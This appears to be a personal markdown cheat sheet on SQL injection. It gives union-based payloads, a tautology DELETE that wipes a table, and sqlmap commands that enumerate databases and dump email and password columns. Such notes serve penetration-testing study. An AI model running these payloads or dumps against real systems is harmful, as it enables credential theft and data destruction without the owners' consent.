#### SQL Injection
* Allows user to execute SQL statements on the vulnerable server.

##### SELECT Statement
```
SELECT <column list> FROM <table> WHERE <condition>
```  
```
SELECT 22, 'string', 0x12, 'another string'
```  
  
##### UNION COMMAND
```
<SELECT STATEMENT 1 > UNION <SELECT STATEMENT 2>;
```
##### Comments
```
SELECT field FROM table; # test comment
SELECT field FROM table; -- test another comment  
```

  
![Screenshot at 2022-12-25 09-01-34](https://user-images.githubusercontent.com/85208639/209456088-7508953a-442e-4aae-bc4e-2ab6a5bbafec.png)


##### Extracting 1st Column of Product Field
```
SELECT Name, Description FROM Products WHERE ID='1'--
```


![Screenshot at 2022-12-25 09-09-04](https://user-images.githubusercontent.com/85208639/209456143-e1ea043b-9c88-4497-9f3d-386474e6a30f.png)

##### Common Locations To Check For SQLi
> Check places that take users input like Cookies, User-Agent, Accept-Language, GET, POST params, etc.

>Inject params with "'"  

##### Exploiting UNION BASED SQLi

```
id='UNION SELECT null;-- - >> Error

Finding No of Fields
id='UNION SELECT null,null,null;-- - >> Use Hit and Trial until something changes

id='UNION SELECT null,null;-- - >> Change is Seen

id='UNION SELECT 'foo','bar';-- - >> Check reflected Field lets assume foo gets reflected. 
```

##### Quering User
```
id='UNION SELECT user(), 'bar';-- - >> user@localhost
```
#### DELETE Statement 
```
DELETE description FROM items WHERE id=value

DELETE description FROM items WHERE id='1' or '1'='1'; >> DELETE every thing 
```

##### Automating UNION Based Injection With SQLMAP
```
sqlmap -u "demo.site" -p search --technique=U -v3

-v3 - Shows Payload Used by SQLMAP 
```

* --dbs > Enumerate database 
--flush-sessions - Flushes current session
```
xyz
information_schema
```
```
sqlmap -u 'demo.local' --technique=U -D xyz --tables >> Queries tables for database name xyz
```

###### Output 
```
a
b
c
d
```

##### Dump Columns
```
sqlmap -u 'demo.local' --technique=U -D xyz -T b --columns
```

###### Output 
```
email
password
```

##### Dump Columns
```
sqlmap -u 'demo.local' --technique=U -D xyz -T b -C email,password --dump
```

